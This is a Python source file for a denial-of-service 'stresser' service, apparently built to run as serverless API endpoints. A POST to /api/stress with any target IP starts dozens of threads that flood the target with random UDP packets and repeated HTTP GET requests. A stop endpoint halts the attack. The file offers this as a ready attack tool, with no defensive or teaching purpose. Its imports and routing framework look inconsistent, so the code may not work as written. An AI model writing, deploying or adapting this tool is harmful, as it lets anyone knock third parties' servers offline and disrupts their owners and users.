import os
import socket
import threading
import random
import time
from vercel import Vercel

app = Vercel()

# Global attack state
ATTACK_RUNNING = False
TARGET_IP = None
THREAD_COUNT = 50  # Reduced for Vercel limits
ATTACK_DURATION = 5  # Shortened due to timeout (max 60s on Pro)

# UDP Flood (Basic, no Scapy)
def udp_flood(target_ip):
    global ATTACK_RUNNING
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)  # 1KB payload
    end_time = time.time() + ATTACK_DURATION
    while time.time() < end_time and ATTACK_RUNNING:
        try:
            sock.sendto(payload, (target_ip, random.randint(1, 65535)))
        except:
            break
    sock.close()

# HTTP Overload (Basic)
def http_overload(target_ip):
    global ATTACK_RUNNING
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((target_ip, 80))
        request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode()
        end_time = time.time() + ATTACK_DURATION
        while time.time() < end_time and ATTACK_RUNNING:
            sock.send(request)
    except:
        pass
    sock.close()

# Launch Attack
def launch_attack(target_ip):
    global ATTACK_RUNNING, TARGET_IP
    ATTACK_RUNNING = True
    TARGET_IP = target_ip
    print(f"[HOMICIDAL STRESSER] Targeting {target_ip}")
    for _ in range(THREAD_COUNT):
        threading.Thread(target=udp_flood, args=(target_ip,)).start()
        threading.Thread(target=http_overload, args=(target_ip,)).start()
    time.sleep(ATTACK_DURATION)
    ATTACK_RUNNING = False

# Vercel API Endpoint
@app.route("/api/stress", methods=["POST"])
def stress():
    global ATTACK_RUNNING
    if ATTACK_RUNNING:
        return {"message": "Attack already in progress"}, 429
    data = app.request.json
    target_ip = data.get("target_ip")
    if not target_ip:
        return {"message": "Missing target_ip"}, 400
    threading.Thread(target=launch_attack, args=(target_ip,)).start()
    return {"message": f"Attack launched on {target_ip}"}, 200

@app.route("/api/stop", methods=["GET"])
def stop():
    global ATTACK_RUNNING
    ATTACK_RUNNING = False
    return {"message": "Attack stopped"}, 200

# Vercel requires a handler
handler = app.handler
